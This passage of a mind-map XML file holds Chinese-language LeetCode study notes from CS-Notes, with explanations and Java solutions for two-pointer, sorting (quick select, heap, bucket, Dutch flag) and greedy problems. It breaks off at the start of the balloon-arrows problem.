    <a aria-label="Permalink: 前言" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E7%9B%AE%E5%BD%95.md#前言">
</a>
    <p dir="auto">
      本文从 Leetcode 中精选大概 200 左右的题目，去除了某些繁杂但是没有多少算法思想的题目，同时保留了面试中经常被问到的经典题目。
    </p>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1209504574" CREATED="1754750422723" MODIFIED="1754750425410" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      算法思想
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_643147095" CREATED="1754750425382" MODIFIED="1754751539514" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E5%8F%8C%E6%8C%87%E9%92%88.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    双指针
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      双指针主要用于遍历数组，两个指针指向不同的元素，从而协同完成任务。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1177184346" CREATED="1754751539515" MODIFIED="1754751539518"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 有序数组的 Two Sum
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      167. Two Sum II - Input array is sorted (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/two-sum-ii-input-array-is-sorted/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/two-sum-ii-input-array-is-sorted/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input: numbers={2, 7, 11, 15}, target=9
Output: index1=1, index2=2</code></pre>
    <p>
      题目描述：在有序数组中找出两个数，使它们的和为 target。
    </p>
    <p>
      使用双指针，一个指针指向值较小的元素，一个指针指向值较大的元素。指向较小元素的指针从头向尾遍历，指向较大元素的指针从尾向头遍历。
    </p>
    <ul>
      <li>
        <p>
          如果两个指针指向元素的和 sum == target，那么得到要求的结果；
        </p>
      </li>
      <li>
        <p>
          如果 sum &gt; target，移动较大的元素，使 sum 变小一些；
        </p>
      </li>
      <li>
        <p>
          如果 sum &lt; target，移动较小的元素，使 sum 变大一些。
        </p>
      </li>
    </ul>
    <p>
      数组中的元素最多遍历一次，时间复杂度为 O(N)。只使用了两个额外变量，空间复杂度为 O(1)。
    </p>
    <p>
      <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/437cb54c-5970-4ba9-b2ef-2541f7d6c81e.gif" width="200" height="179" style="width: 200px; height: 179px;"/>
      
    </p>
    <pre><code class="language-plaintext">public int[] twoSum(int[] numbers, int target) {
    if (numbers == null) return null;
    int i = 0, j = numbers.length - 1;
    while (i &lt; j) {
        int sum = numbers[i] + numbers[j];
        if (sum == target) {
            return new int[]{i + 1, j + 1};
        } else if (sum &lt; target) {
            i++;
        } else {
            j--;
        }
    }
    return null;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_384102961" CREATED="1754751539519" MODIFIED="1754751539520"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 两数平方和
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      633. Sum of Square Numbers (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/sum-of-square-numbers/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/sum-of-square-numbers/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input: 5
Output: True
Explanation: 1 * 1 + 2 * 2 = 5</code></pre>
    <p>
      题目描述：判断一个非负整数是否为两个整数的平方和。
    </p>
    <p>
      可以看成是在元素为 0~target 的有序数组中查找两个数，使得这两个数的平方和为 target，如果能找到，则返回 true，表示 target 是两个整数的平方和。
    </p>
    <p>
      本题和 167. Two Sum II - Input array is sorted 类似，只有一个明显区别：一个是和为 target，一个是平方和为 target。本题同样可以使用双指针得到两个数，使其平方和为 target。
    </p>
    <p>
      本题的关键是右指针的初始化，实现剪枝，从而降低时间复杂度。设右指针为 x，左指针固定为 0，为了使 0<sup>2</sup>&#xa0;+ x<sup>2</sup>&#xa0;的值尽可能接近 target，我们可以将 x 取为 sqrt(target)。
    </p>
    <p>
      因为最多只需要遍历一次 0~sqrt(target)，所以时间复杂度为 O(sqrt(target))。又因为只使用了两个额外的变量，因此空间复杂度为 O(1)。
    </p>
    <pre><code class="language-plaintext">public boolean judgeSquareSum(int target) {
     if (target &lt; 0) return false;
     int i = 0, j = (int) Math.sqrt(target);
     while (i &lt;= j) {
         int powSum = i * i + j * j;
         if (powSum == target) {
             return true;
         } else if (powSum &gt; target) {
             j--;
         } else {
             i++;
         }
     }
     return false;
 }</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_590408346" CREATED="1754751539521" MODIFIED="1754751539524"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 反转字符串中的元音字符
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      345. Reverse Vowels of a String (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/reverse-vowels-of-a-string/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/reverse-vowels-of-a-string/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Given s = &quot;leetcode&quot;, return &quot;leotcede&quot;.</code></pre>
    <p>
      <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a7cb8423-895d-4975-8ef8-662a0029c772.png" width="400" height="197" style="width: 400px; height: 197px;"/>
      
    </p>
    <p>
      使用双指针，一个指针从头向尾遍历，一个指针从尾到头遍历，当两个指针都遍历到元音字符时，交换这两个元音字符。
    </p>
    <p>
      为了快速判断一个字符是不是元音字符，我们将全部元音字符添加到集合 HashSet 中，从而以 O(1) 的时间复杂度进行该操作。
    </p>
    <ul>
      <li>
        <p>
          时间复杂度为 O(N)：只需要遍历所有元素一次
        </p>
      </li>
      <li>
        <p>
          空间复杂度 O(1)：只需要使用两个额外变量
        </p>
      </li>
    </ul>
    <p>
      <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ef25ff7c-0f63-420d-8b30-eafbeea35d11.gif" width="400" height="244" style="width: 400px; height: 244px;"/>
      
    </p>
    <pre><code class="language-plaintext">private final static HashSet&lt;Character&gt; vowels = new HashSet&lt;&gt;(
        Arrays.asList('a', 'e', 'i', 'o', 'u', 'A', 'E', 'I', 'O', 'U'));
public String reverseVowels(String s) {
    if (s == null) return null;
    int i = 0, j = s.length() - 1;
    char[] result = new char[s.length()];
    while (i &lt;= j) {
        char ci = s.charAt(i);
        char cj = s.charAt(j);
        if (!vowels.contains(ci)) {
            result[i++] = ci;
        } else if (!vowels.contains(cj)) {
            result[j--] = cj;
        } else {
            result[i++] = cj;
            result[j--] = ci;
        }
    }
    return new String(result);
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1094179611" CREATED="1754751539524" MODIFIED="1754751539526"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 回文字符串
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      680. Valid Palindrome II (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/valid-palindrome-ii/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/valid-palindrome-ii/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input: &quot;abca&quot;
Output: True
Explanation: You could delete the character 'c'.</code></pre>
    <p>
      题目描述：可以删除一个字符，判断是否能构成回文字符串。
    </p>
    <p>
      所谓的回文字符串，是指具有左右对称特点的字符串，例如 &quot;abcba&quot; 就是一个回文字符串。
    </p>
    <p>
      使用双指针可以很容易判断一个字符串是否是回文字符串：令一个指针从左到右遍历，一个指针从右到左遍历，这两个指针同时移动一个位置，每次都判断两个指针指向的字符是否相同，如果都相同，字符串才是具有左右对称性质的回文字符串。
    </p>
    <p>
      <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/fcc941ec-134b-4dcd-bc86-1702fd305300.gif" width="250" height="221" style="width: 250px; height: 221px;"/>
      
    </p>
    <p>
      本题的关键是处理删除一个字符。在使用双指针遍历字符串时，如果出现两个指针指向的字符不相等的情况，我们就试着删除一个字符，再判断删除完之后的字符串是否是回文字符串。
    </p>
    <p>
      在判断是否为回文字符串时，我们不需要判断整个字符串，因为左指针左边和右指针右边的字符之前已经判断过具有对称性质，所以只需要判断中间的子字符串即可。
    </p>
    <p>
      在试着删除字符时，我们既可以删除左指针指向的字符，也可以删除右指针指向的字符。
    </p>
    <p>
      <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/db5f30a7-8bfa-4ecc-ab5d-747c77818964.gif" width="300" height="202" style="width: 300px; height: 202px;"/>
      
    </p>
    <pre><code class="language-plaintext">public boolean validPalindrome(String s) {
    for (int i = 0, j = s.length() - 1; i &lt; j; i++, j--) {
        if (s.charAt(i) != s.charAt(j)) {
            return isPalindrome(s, i, j - 1) || isPalindrome(s, i + 1, j);
        }
    }
    return true;
}
private boolean isPalindrome(String s, int i, int j) {
    while (i &lt; j) {
        if (s.charAt(i++) != s.charAt(j--)) {
            return false;
        }
    }
    return true;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_787921371" CREATED="1754751539527" MODIFIED="1754751539529"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 归并两个有序数组
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      88. Merge Sorted Array (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/merge-sorted-array/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/merge-sorted-array/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input:
nums1 = [1,2,3,0,0,0], m = 3
nums2 = [2,5,6],       n = 3
Output: [1,2,2,3,5,6]</code></pre>
    <p>
      题目描述：把归并结果存到第一个数组上。
    </p>
    <p>
      需要从尾开始遍历，否则在 nums1 上归并得到的值会覆盖还未进行归并比较的值。
    </p>
    <pre><code class="language-plaintext">public void merge(int[] nums1, int m, int[] nums2, int n) {
    int index1 = m - 1, index2 = n - 1;
    int indexMerge = m + n - 1;
    while (index2 &gt;= 0) {
        if (index1 &lt; 0) {
            nums1[indexMerge--] = nums2[index2--];
        } else if (index2 &lt; 0) {
            nums1[indexMerge--] = nums1[index1--];
        } else if (nums1[index1] &gt; nums2[index2]) {
            nums1[indexMerge--] = nums1[index1--];
        } else {
            nums1[indexMerge--] = nums2[index2--];
        }
    }
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1722232690" CREATED="1754751539529" MODIFIED="1754751539533"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      6. 判断链表是否存在环
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      141. Linked List Cycle (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/linked-list-cycle/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/linked-list-cycle/description/">力扣</a>
    </p>
    <p>
      使用双指针，一个指针每次移动一个节点，一个指针每次移动两个节点，如果存在环，那么这两个指针一定会相遇。
    </p>
    <pre><code class="language-plaintext">public boolean hasCycle(ListNode head) {
    if (head == null) {
        return false;
    }
    ListNode l1 = head, l2 = head.next;
    while (l1 != null &amp;&amp; l2 != null &amp;&amp; l2.next != null) {
        if (l1 == l2) {
            return true;
        }
        l1 = l1.next;
        l2 = l2.next.next;
    }
    return false;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1351440231" CREATED="1754751539533" MODIFIED="1754751539535"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      7. 最长子序列
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      524. Longest Word in Dictionary through Deleting (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/longest-word-in-dictionary-through-deleting/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/longest-word-in-dictionary-through-deleting/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input:
s = &quot;abpcplea&quot;, d = [&quot;ale&quot;,&quot;apple&quot;,&quot;monkey&quot;,&quot;plea&quot;]
Output:
&quot;apple&quot;</code></pre>
    <p>
      题目描述：删除 s 中的一些字符，使得它构成字符串列表 d 中的一个字符串，找出能构成的最长字符串。如果有多个相同长度的结果，返回字典序的最小字符串。
    </p>
    <p>
      通过删除字符串 s 中的一个字符能得到字符串 t，可以认为 t 是 s 的子序列，我们可以使用双指针来判断一个字符串是否为另一个字符串的子序列。
    </p>
    <pre><code class="language-plaintext">public String findLongestWord(String s, List&lt;String&gt; d) {
    String longestWord = &quot;&quot;;
    for (String target : d) {
        int l1 = longestWord.length(), l2 = target.length();
        if (l1 &gt; l2 || (l1 == l2 &amp;&amp; longestWord.compareTo(target) &lt; 0)) {
            continue;
        }
        if (isSubstr(s, target)) {
            longestWord = target;
        }
    }
    return longestWord;
}
private boolean isSubstr(String s, String target) {
    int i = 0, j = 0;
    while (i &lt; s.length() &amp;&amp; j &lt; target.length()) {
        if (s.charAt(i) == target.charAt(j)) {
            j++;
        }
        i++;
    }
    return j == target.length();
}</code></pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_806626751" CREATED="1754750425385" MODIFIED="1754751539536" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E6%8E%92%E5%BA%8F.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    排序
  </body>
</html>
</richcontent>
<node ID="ID_1790420423" CREATED="1754751539537" MODIFIED="1754751539538"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      快速选择
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      用于求解 <strong>Kth Element</strong>&#xa0;问题，也就是第 K 个元素的问题。
    </p>
    <p>
      可以使用快速排序的 partition() 进行实现。需要先打乱数组，否则最坏情况下时间复杂度为 O(N<sup>2</sup>)。
    </p>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1532218917" CREATED="1754751539539" MODIFIED="1754751539541"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      堆
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      用于求解 <strong>TopK Elements</strong>&#xa0;问题，也就是 K 个最小元素的问题。使用最小堆来实现 TopK 问题，最小堆使用大顶堆来实现，大顶堆的堆顶元素为当前堆的最大元素。实现过程：不断地往大顶堆中插入新元素，当堆中元素的数量大于 k 时，移除堆顶元素，也就是当前堆中最大的元素，剩下的元素都为当前添加过的元素中最小的 K 个元素。插入和移除堆顶元素的时间复杂度都为 log<sub>2</sub>N。
    </p>
    <p>
      堆也可以用于求解 Kth Element 问题，得到了大小为 K 的最小堆之后，因为使用了大顶堆来实现，因此堆顶元素就是第 K 大的元素。
    </p>
    <p>
      快速选择也可以求解 TopK Elements 问题，因为找到 Kth Element 之后，再遍历一次数组，所有小于等于 Kth Element 的元素都是 TopK Elements。
    </p>
    <p>
      可以看到，快速选择和堆排序都可以求解 Kth Element 和 TopK Elements 问题。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1809551552" CREATED="1754751539542" MODIFIED="1754751539544"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. Kth Element
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      215. Kth Largest Element in an Array (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/kth-largest-element-in-an-array/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/kth-largest-element-in-an-array/description/">力扣</a>
    </p>
    <pre>Input: [3,2,1,5,6,4] and k = 2
Output: 5</pre>
    <p>
      题目描述：找到倒数第 k 个的元素。
    </p>
    <p>
      <strong>排序</strong>&#xa0;：时间复杂度 O(NlogN)，空间复杂度 O(1)
    </p>
    <pre>public int findKthLargest(int[] nums, int k) {
    Arrays.sort(nums);
    return nums[nums.length - k];
}</pre>
    <p>
      <strong>堆</strong>&#xa0;：时间复杂度 O(NlogK)，空间复杂度 O(K)。
    </p>
    <pre>public int findKthLargest(int[] nums, int k) {
    PriorityQueue&lt;Integer&gt; pq = new PriorityQueue&lt;&gt;(); // 小顶堆
    for (int val : nums) {
        pq.add(val);
        if (pq.size() &gt; k)  // 维护堆的大小为 K
            pq.poll();
    }
    return pq.peek();
}</pre>
    <p>
      <strong>快速选择</strong>&#xa0;：时间复杂度 O(N)，空间复杂度 O(1)
    </p>
    <pre>public int findKthLargest(int[] nums, int k) {
    k = nums.length - k;
    int l = 0, h = nums.length - 1;
    while (l &lt; h) {
        int j = partition(nums, l, h);
        if (j == k) {
            break;
        } else if (j &lt; k) {
            l = j + 1;
        } else {
            h = j - 1;
        }
    }
    return nums[k];
}
private int partition(int[] a, int l, int h) {
    int i = l, j = h + 1;
    while (true) {
        while (a[++i] &lt; a[l] &amp;&amp; i &lt; h) ;
        while (a[--j] &gt; a[l] &amp;&amp; j &gt; l) ;
        if (i &gt;= j) {
            break;
        }
        swap(a, i, j);
    }
    swap(a, l, j);
    return j;
}
private void swap(int[] a, int i, int j) {
    int t = a[i];
    a[i] = a[j];
    a[j] = t;
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_282853790" CREATED="1754751539544" MODIFIED="1754751539544"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      桶排序
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1088944036" CREATED="1754751539546" MODIFIED="1754751539550"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 出现频率最多的 k 个元素
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      347. Top K Frequent Elements (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/top-k-frequent-elements/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/top-k-frequent-elements/description/">力扣</a>
    </p>
    <pre>Given [1,1,1,2,2,3] and k = 2, return [1,2].</pre>
    <p>
      设置若干个桶，每个桶存储出现频率相同的数。桶的下标表示数出现的频率，即第 i 个桶中存储的数出现的频率为 i。
    </p>
    <p>
      把数都放到桶之后，从后向前遍历桶，最先得到的 k 个数就是出现频率最多的的 k 个数。
    </p>
    <pre>public int[] topKFrequent(int[] nums, int k) {
    Map&lt;Integer, Integer&gt; frequencyForNum = new HashMap&lt;&gt;();
    for (int num : nums) {
        frequencyForNum.put(num, frequencyForNum.getOrDefault(num, 0) + 1);
    }
    List&lt;Integer&gt;[] buckets = new ArrayList[nums.length + 1];
    for (int key : frequencyForNum.keySet()) {
        int frequency = frequencyForNum.get(key);
        if (buckets[frequency] == null) {
            buckets[frequency] = new ArrayList&lt;&gt;();
        }
        buckets[frequency].add(key);
    }
    List&lt;Integer&gt; topK = new ArrayList&lt;&gt;();
    for (int i = buckets.length - 1; i &gt;= 0 &amp;&amp; topK.size() &lt; k; i--) {
        if (buckets[i] == null) {
            continue;
        }
        if (buckets[i].size() &lt;= (k - topK.size())) {
            topK.addAll(buckets[i]);
        } else {
            topK.addAll(buckets[i].subList(0, k - topK.size()));
        }
    }
    int[] res = new int[k];
    for (int i = 0; i &lt; k; i++) {
        res[i] = topK.get(i);
    }
    return res;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1026448600" CREATED="1754751539550" MODIFIED="1754751539554"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 按照字符出现次数对字符串排序
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      451. Sort Characters By Frequency (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/sort-characters-by-frequency/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/sort-characters-by-frequency/description/">力扣</a>
    </p>
    <pre>Input:
&quot;tree&quot;
Output:
&quot;eert&quot;
Explanation:
'e' appears twice while 'r' and 't' both appear once.
So 'e' must appear before both 'r' and 't'. Therefore &quot;eetr&quot; is also a valid answer.</pre>
    <pre>public String frequencySort(String s) {
    Map&lt;Character, Integer&gt; frequencyForNum = new HashMap&lt;&gt;();
    for (char c : s.toCharArray())
        frequencyForNum.put(c, frequencyForNum.getOrDefault(c, 0) + 1);
    List&lt;Character&gt;[] frequencyBucket = new ArrayList[s.length() + 1];
    for (char c : frequencyForNum.keySet()) {
        int f = frequencyForNum.get(c);
        if (frequencyBucket[f] == null) {
            frequencyBucket[f] = new ArrayList&lt;&gt;();
        }
        frequencyBucket[f].add(c);
    }
    StringBuilder str = new StringBuilder();
    for (int i = frequencyBucket.length - 1; i &gt;= 0; i--) {
        if (frequencyBucket[i] == null) {
            continue;
        }
        for (char c : frequencyBucket[i]) {
            for (int j = 0; j &lt; i; j++) {
                str.append(c);
            }
        }
    }
    return str.toString();
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1801873180" CREATED="1754751539554" MODIFIED="1754751539556"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      荷兰国旗问题
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      荷兰国旗包含三种颜色：红、白、蓝。
    </p>
    <p>
      有三种颜色的球，算法的目标是将这三种球按颜色顺序正确地排列。它其实是三向切分快速排序的一种变种，在三向切分快速排序中，每次切分都将数组分成三个区间：小于切分元素、等于切分元素、大于切分元素，而该算法是将数组分成三个区间：等于红色、等于白色、等于蓝色。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7a3215ec-6fb7-4935-8b0d-cb408208f7cb.png"/>
    <br/>
  </body>
</html></richcontent>
<node ID="ID_1449857261" CREATED="1754751539557" MODIFIED="1754751539559"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 按颜色进行排序
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      75. Sort Colors (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/sort-colors/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/sort-colors/description/">力扣</a>
    </p>
    <pre>Input: [2,0,2,1,1,0]
Output: [0,0,1,1,2,2]</pre>
    <p>
      题目描述：只有 0/1/2 三种颜色。
    </p>
    <pre>public void sortColors(int[] nums) {
    int zero = -1, one = 0, two = nums.length;
    while (one &lt; two) {
        if (nums[one] == 0) {
            swap(nums, ++zero, one++);
        } else if (nums[one] == 2) {
            swap(nums, --two, one);
        } else {
            ++one;
        }
    }
}
private void swap(int[] nums, int i, int j) {
    int t = nums[i];
    nums[i] = nums[j];
    nums[j] = t;
}</pre>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_1182925697" CREATED="1754750425388" MODIFIED="1754751539560" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E8%B4%AA%E5%BF%83%E6%80%9D%E6%83%B3.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    贪心思想
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      保证每次操作都是局部最优的，并且最后得到的结果是全局最优的。
    </p>
  </body>
</html></richcontent>
<node ID="ID_211404523" CREATED="1754751539561" MODIFIED="1754751539564"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 分配饼干
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      455. Assign Cookies (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/assign-cookies/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/assign-cookies/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input: grid[1,3], size[1,2,4]
Output: 2</code></pre>
    <p>
      题目描述：每个孩子都有一个满足度 grid，每个饼干都有一个大小 size，只有饼干的大小大于等于一个孩子的满足度，该孩子才会获得满足。求解最多可以获得满足的孩子数量。
    </p>
    <ol>
      <li>
        <p>
          给一个孩子的饼干应当尽量小并且又能满足该孩子，这样大饼干才能拿来给满足度比较大的孩子。
        </p>
      </li>
      <li>
        <p>
          因为满足度最小的孩子最容易得到满足，所以先满足满足度最小的孩子。
        </p>
      </li>
    </ol>
    <p>
      在以上的解法中，我们只在每次分配时饼干时选择一种看起来是当前最优的分配方法，但无法保证这种局部最优的分配方法最后能得到全局最优解。我们假设能得到全局最优解，并使用反证法进行证明，即假设存在一种比我们使用的贪心策略更优的最优策略。如果不存在这种最优策略，表示贪心策略就是最优策略，得到的解也就是全局最优解。
    </p>
    <p>
      证明：假设在某次选择中，贪心策略选择给当前满足度最小的孩子分配第 m 个饼干，第 m 个饼干为可以满足该孩子的最小饼干。假设存在一种最优策略，可以给该孩子分配第 n 个饼干，并且 m \&lt; n。我们可以发现，经过这一轮分配，贪心策略分配后剩下的饼干一定有一个比最优策略来得大。因此在后续的分配中，贪心策略一定能满足更多的孩子。也就是说不存在比贪心策略更优的策略，即贪心策略就是最优策略。
    </p>
    <p>
      <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e69537d2-a016-4676-b169-9ea17eeb9037.gif"/>
      
    </p>
    <pre><code class="language-plaintext">public int findContentChildren(int[] grid, int[] size) {
    if (grid == null || size == null) return 0;
    Arrays.sort(grid);
    Arrays.sort(size);
    int gi = 0, si = 0;
    while (gi &lt; grid.length &amp;&amp; si &lt; size.length) {
        if (grid[gi] &lt;= size[si]) {
            gi++;
        }
        si++;
    }
    return gi;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_280929279" CREATED="1754751539565" MODIFIED="1754751539568"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 不重叠的区间个数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      435. Non-overlapping Intervals (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/non-overlapping-intervals/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/non-overlapping-intervals/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input: [ [1,2], [1,2], [1,2] ]
Output: 2
Explanation: You need to remove two [1,2] to make the rest of intervals non-overlapping.</code></pre>
    <pre><code class="language-plaintext">Input: [ [1,2], [2,3] ]
Output: 0
Explanation: You don't need to remove any of the intervals since they're already non-overlapping.</code></pre>
    <p>
      题目描述：计算让一组区间不重叠所需要移除的区间个数。
    </p>
    <p>
      先计算最多能组成的不重叠区间个数，然后用区间总个数减去不重叠区间的个数。
    </p>
    <p>
      在每次选择中，区间的结尾最为重要，选择的区间结尾越小，留给后面的区间的空间越大，那么后面能够选择的区间个数也就越大。
    </p>
    <p>
      按区间的结尾进行排序，每次选择结尾最小，并且和前一个区间不重叠的区间。
    </p>
    <pre><code class="language-plaintext">public int eraseOverlapIntervals(int[][] intervals) {
    if (intervals.length == 0) {
        return 0;
    }
    Arrays.sort(intervals, Comparator.comparingInt(o -&gt; o[1]));
    int cnt = 1;
    int end = intervals[0][1];
    for (int i = 1; i &lt; intervals.length; i++) {
        if (intervals[i][0] &lt; end) {
            continue;
        }
        end = intervals[i][1];
        cnt++;
    }
    return intervals.length - cnt;
}</code></pre>
    <p>
      使用 lambda 表示式创建 Comparator 会导致算法运行时间过长，如果注重运行时间，可以修改为普通创建 Comparator 语句：
    </p>
    <pre><code class="language-plaintext">Arrays.sort(intervals, new Comparator&lt;int[]&gt;() {
     @Override
     public int compare(int[] o1, int[] o2) {
         return (o1[1] &lt; o2[1]) ? -1 : ((o1[1] == o2[1]) ? 0 : 1);
     }
});</code></pre>
    <p>
      实现 compare() 函数时避免使用 <code>return o1[1] - o2[1];</code>&#xa0;这种减法操作，防止溢出。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_230929720" CREATED="1754751539568" MODIFIED="1754751539572"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 投飞镖刺破气球
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      452. Minimum Number of Arrows to Burst Balloons (Medium)
    </p>
    <p>
